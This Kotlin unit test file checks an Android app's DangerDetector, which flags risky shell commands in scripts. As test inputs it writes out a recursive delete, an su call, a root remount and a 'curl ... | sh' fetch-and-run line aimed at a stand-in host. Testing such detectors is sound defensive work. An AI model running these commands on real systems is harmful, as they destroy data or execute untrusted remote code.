package com.shrunner.app.shell

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class DangerDetectorTest {
    private fun ids(script: String) = DangerDetector.scan(script).map { it.ruleId }

    @Test fun flagsRecursiveDelete() = assertTrue("rm-recursive" in ids("rm -rf /sdcard/foo"))
    @Test fun ignoresPlainRm() = assertTrue(ids("rm file.txt").isEmpty())
    @Test fun flagsSu() = assertTrue("su" in ids("su -c 'id'"))
    @Test fun flagsMount() = assertTrue("mount" in ids("mount -o remount,rw /"))
    @Test fun flagsPipeToShell() = assertTrue("pipe-to-shell" in ids("curl http://x.test/a | sh"))
    @Test fun ignoresComments() = assertTrue(ids("# rm -rf /").isEmpty())
    @Test fun ignoresHarmlessScript() = assertTrue(ids("#!/system/bin/sh\necho hello\nls -la").isEmpty())

    @Test fun fingerprintTracksExactLine() {
        val a = DangerDetector.scan("rm -rf /a").single().fingerprint
        val b = DangerDetector.scan("rm -rf /b").single().fingerprint
        val a2 = DangerDetector.scan("echo hi\n  rm -rf /a  ").single().fingerprint
        assertEquals(a, a2)
        assertTrue(a != b)
    }
}
